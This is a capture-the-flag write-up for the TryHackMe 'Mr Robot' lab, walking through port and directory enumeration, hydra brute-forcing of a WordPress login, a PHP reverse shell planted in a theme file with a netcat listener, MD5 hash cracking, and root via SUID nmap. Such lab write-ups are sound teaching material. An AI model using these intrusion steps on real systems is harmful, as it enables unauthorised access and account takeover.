# TryHackMe: Mr Robot CTF

https://tryhackme.com/room/mrrobot

## 1. Network Enumeration

Use `nmap` to run a quick port scan to see what services are running on the box:

```
$ nmap <ip-address>

Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-26 10:42 CET
Nmap scan report for <ip-address>
Host is up (0.18s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https

Nmap done: 1 IP address (1 host up) scanned in 24.19 seconds
```

We see that this box is running the following services: SSH, HTTP, and HTTPS. Port 22 hosting SSH looks like it is closed. Let's take a look at the HTTP server.

## 2. Web Server Enumeration

The home page of the web server shows what seems to be a terminal, but there are only a few commands we're allowed to run. The different commands show some of the Mr. Robot lore, but doesn't appear to show any other useful information. Lets start `gobuster` to see if we can find any hidden web pages.

```
$ gobuster -u http://<ip-address> -w /usr/share/wordlists/dirb/common.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://<ip-address>/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2024/01/26 10:47:19 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/0 (Status: 301)
/admin (Status: 301)
/atom (Status: 301)
/audio (Status: 301)
/blog (Status: 301)
/css (Status: 301)
/dashboard (Status: 302)
/favicon.ico (Status: 200)
/feed (Status: 301)
/Image (Status: 301)
/image (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/index.php (Status: 301)
/intro (Status: 200)
/js (Status: 301)
/license (Status: 200)
/login (Status: 302)
/page1 (Status: 301)
/phpmyadmin (Status: 403)
/rdf (Status: 301)
/readme (Status: 200)
/robots (Status: 200)
/robots.txt (Status: 200)
/rss (Status: 301)
/rss2 (Status: 301)
/sitemap (Status: 200)
/sitemap.xml (Status: 200)
/video (Status: 301)
/wp-admin (Status: 301)
/wp-config (Status: 200)
/wp-content (Status: 301)
/wp-cron (Status: 200)
/wp-includes (Status: 301)
/wp-load (Status: 200)
/wp-links-opml (Status: 200)
/wp-login (Status: 200)
/wp-signup (Status: 302)
=====================================================
2024/01/26 10:49:20 Finished
=====================================================
```

Wow, that's along list, let's start working our way down. The first interesting file I found was `/license`, which contains some text that looks like bas64 at the bottom of the file. Sure enough, after decoding the base64 we found a username/password combination!

The next interesting file I found was `/robots.txt`, which references two different files: `fsocity.dic` and `key-1-of-3.txt`. These contain a username/password list, and our first key!

We also found from our web server enumeration many standard directories for a wordpress site. Let's try the credientials we found previously on the login page: `/wp-login`.

## 2.5 (Alternate Method) Brute Force

Although you can find the Wordpress credentials in the `/license` file, I also found an alternate way that uses the `fsocity.dic` file that was provided: brute force.

I noticed while exploring the login page at `/wp-login` that the error message specifically stated that the username I provided was incorrect. This makes a username/password combination much easier to brute force because we can do them one at a time instead of having to guess both correctly at the same time. I'll use `hydra` to brute force the username.

```
$ hydra -L fsocity.dic -p password <ip-address> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.41.14%2Fwp-admin%2F&testcookie=1:F=Invalid username" -v
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-26 11:59:29
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://<ip-address>:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.41.14%2Fwp-admin%2F&testcookie=1:F=Invalid username
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[80][http-post-form] host: <ip-address>   login: <redacted>   password: password
^C[ERROR] Received signal 2, going down ...
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Great, we've got a username! Now can we do the same to get the password? Unfortunately it was taking a very long time...after taking a closer look at the `fsocity.dic` wordlist, I realized there were lots of duplicate entires. I filtered out all the duplicates:

```
$ sort fsocity.dic | uniq > fsocity.dic.unique
```

Now I'll try running `hydra` again:

```
$ hydra -l <redacted> -P fsocity.dic.unique <ip-address> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.41.14%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -v
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-26 12:07:57
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
[DATA] attacking http-post-form://<ip-address>:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.41.14%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 947.00 tries/min, 947 tries in 00:01h, 10505 to do in 00:12h, 16 active
[STATUS] 944.00 tries/min, 2832 tries in 00:03h, 8620 to do in 00:10h, 16 active
[VERBOSE] Page redirected to http://<ip-address>/wp-admin/
[80][http-post-form] host: <ip-address>   login: <redacted<>   password: <redacted>
[STATUS] attack finished for <ip-address> (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-26 12:14:26
```

We got it! Now we can login to the Wordpress site using these credentials.

## 3. Wordpress Exploitation

Using the credentials we found in `/license` (or from brute forcing), we are able to login to the Wordpress site as the admin user. Right away we see this is Wordpress 4.3.1 running the "twentyfifteen" theme. As the admin user, we may be able to edit some php file included in the theme, enabling us to execute arbitrary code.

For example, if you navigate to Appearance --> Editor in the left menu panel, you'll be able to edit theme files. I'll take the first file listed, `404.php`, and add my own php reverse shell script in it's place. Now, I'll open a netcat listener on my machine to receive the reverse shell, then navigate to `http://<ip-address>/wp-content/themes/twentyfifteen/404.php` in my browser:

```
$ nc -lvnp <port>

Listening on 0.0.0.0 <port>
Connection received on <ip-address> 47007
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 10:20:04 up 43 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$
$ whoami
daemon
```

We have a reverse shell!

## 4. Privilege Escalation

Let's take a look around. First, I'll check out the `/home` directory to see what other users are on this machine. There is a home directory for `robot` that we have read access to!

```
$ ls -la /home/robot/

total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

We found the second flag, but we can't read it yet. The file `password.raw-md5` contains a password hash for user `robot`, let's see if we can crack the hash using John the Ripper.

```
$ echo "<redacted-hash-for-robot>" > hash
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5         
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
<redacted> (?)     
1g 0:00:00:00 DONE (2024-01-26 11:30) 10.00g/s 407040p/s 407040c/s 407040C/s bonjour1..teletubbies
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

We got it! Now we can switch users to `robot` and get the second key.

```
daemon@linux:/home/robot$ su robot
Password: <redacted>

robot@linux:~$ whoami
robot
robot@linux:~$ cat /home/robot/flag-2-of-3.txt
<redacted>
```

## 5. Privilege Escalation Part 2

Our next step is getting root. I did a few standard things to check for attack vectors: check what groups `robot` is in, check `sudo` privileges, and lastly a quick search for SUID files.

```
robot@linux:~$ find / -perm /4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

Most of these are pretty standard, but one of them stands out to me: `namp`. Because the SUID bit is set, whenever `nmap` is executed it runs as the root user. We can exploit this to become root outselves. One way we can do this is by entering `nmap`'s "interactive" mode, then executing arbitrary commands as root:

```
robot@linux:~$ nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !/bin/sh
!/bin/sh
# whoami
whoami
root
```

We are root now!

## 6. Root

We now have access to `/root` and can read the final flag!

```
# ls -l /root
total 4
-rw-r--r-- 1 root root  0 Nov 13  2015 firstboot_done
-r-------- 1 root root 33 Nov 13  2015 key-3-of-3.txt
# cat /root/key-3-of-3.txt
<redacted>
```